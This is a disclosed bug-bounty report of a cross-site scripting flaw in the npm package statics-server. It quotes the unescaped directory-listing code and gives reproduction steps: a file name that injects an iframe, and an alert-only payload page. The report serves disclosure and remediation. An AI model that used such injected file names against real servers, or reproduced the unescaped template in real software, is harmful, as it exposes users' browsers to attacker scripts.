# [statics-server] XSS via injected iframe in file name when statics-server displays directory index in the browser

## Report Details
- **Report ID**: 355458
- **URL**: https://hackerone.com/reports/355458
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2018-05-21T08:52:25.560Z
- **Disclosed**: 2018-07-14T20:20:07.775Z

## Reporter
- **Username**: bl4de
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: nodejs-ecosystem

## Vulnerability Information
Hi Team,

I would like to report HTML Injection in statics-server module.
It is possible to inject malicious ```iframe``` tag via filename and execute arbitray JavaScript code.

# Module


**module name:** statics-server
**version:** 0.0.9
**npm page:** https://www.npmjs.com/package/statics-server

### Module Description


npm install statics-server -g

Go to the folder you want to statics-server

Run the server statics-server


### Module Stats

~80-100 downloads/month

# Vulnerability

## Vulnerability Description

```statics-server``` does not implement any HTML escaping when displays directory index in the browser. Variable ```v``` is used in ```<a href>``` element without escaping, which allows to embed HTML ```<iframe>``` tag with ```src``` attribute points to another HTML file in the directory. This file can contain malicious JavaScript code, which will be executed:

```javascript
// ./node_modules/statics-server/index.js, line 18:

    if(fs.lstatSync(staticPath).isDirectory()){
        var files=fs.readdirSync(staticPath);
        var lis='';
        files.forEach((v,i)=>{
            if(fs.lstatSync(path.resolve(staticPath,v)).isDirectory()){
                lis+=`<li><a href="${req.url}${v}/">${v}/</a></li>`;
            }else {
                lis+=`<li><a href="${req.url}${v}">${v}</a></li>`
            }
        });

        (...)

```

## Steps To Reproduce:

Install ```statics-server``` module:

```
$ npm install statics-server
```

- create file with the following filename:

```
"><iframe src="malware_frame.html">

```

- create ```malware_frame.html``` file with following content:

```html
<html>

<head>
    <meta charset="utf8" />
    <title>Frame embeded with malware :P</title>
</head>

<body>
    <p>iframe element with malicious code</p>
    <script>
        alert('Uh oh, I am bad, bad malware!!!')
    </script>
</body>

</html>
```

Run ```statics-server```:

```
$ ./node_modules/statics-server/index.js 
服务器已经启动
访问localhost:8080

```

- in browser, open the following url:

```
http://localhost:8080
```

You see JavaScript from ```malware_frame.html``` executed immediately:

{F299923}


## Patch

```v``` variable in provided code fragment should be escaped before is send back to the browser.


## Supporting Material/References:

- Operating system: Ubuntu 16.04
- Node.js 8.11.1
- npm v. 6.0.1
- Chromium 67.0.3388.0 (Developer Build) (64-bit)

## Wrap up

- I contacted the maintainer to let him know: [N] 
- I opened an issue in the related repository: [N] 


Regards,

Rafal 'bl4de' Janicki

## Impact

An attacker is able to execute malicious JavaScript in context of other user's browser.

## Attachments
- 1.jpg
